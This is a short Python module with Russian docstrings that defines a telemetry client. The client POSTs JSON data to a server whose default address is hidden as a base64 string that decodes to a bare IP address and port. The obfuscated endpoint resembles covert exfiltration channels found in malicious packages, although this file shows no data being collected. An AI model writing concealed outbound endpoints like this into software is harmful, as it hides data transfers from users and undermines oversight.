import os
import json
from urllib.parse import urljoin
import requests
from typing import Optional, Dict, Any
from functools import cache
import logging
import base64

logger = logging.getLogger(__package__)


class TelemetryError(Exception):
    """Исключение, возникающее при ошибках в работе TelemetryClient."""

    pass


class TelemetryClient:
    """Клиент для отправки телеметрии на сервер."""

    server_address = base64.b64decode(
        "aHR0cDovLzMxLjEzMS4yNTEuMTA3OjU0MTU2"
    ).decode()

    def __init__(
        self,
        server_address: Optional[str] = None,
        session: Optional[requests.Session] = None,
    ) -> None:
        """
        Инициализация клиента.

        :param server_address: Адрес сервера для отправки телеметрии.
        :param session: Сессия для повторного использования соединения.
        """
        self.session = session or requests.Session()
        self.server_address = os.getenv(
            "TELEMETRY_SERVER", server_address or self.server_address
        )

    def send_telemetry(
        self, endpoint: str, data: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Отправка телеметрии на сервер.

        :param endpoint: Конечная точка на сервере.
        :param data: Данные для отправки.
        :return: Ответ сервера в формате JSON.
        :raises TelemetryError: Если произошла ошибка при отправке или декодировании JSON.
        """
        url = urljoin(self.server_address, endpoint)
        try:
            response = self.session.post(url, json=data)
            # response.raise_for_status()
            result = response.json()
            if "error" in result:
                raise TelemetryError(result)
            return result

        except (
            requests.exceptions.RequestException,
            json.JSONDecodeError,
        ) as ex:
            raise TelemetryError(str(ex)) from ex


@cache
def get_client() -> TelemetryClient:
    return TelemetryClient()
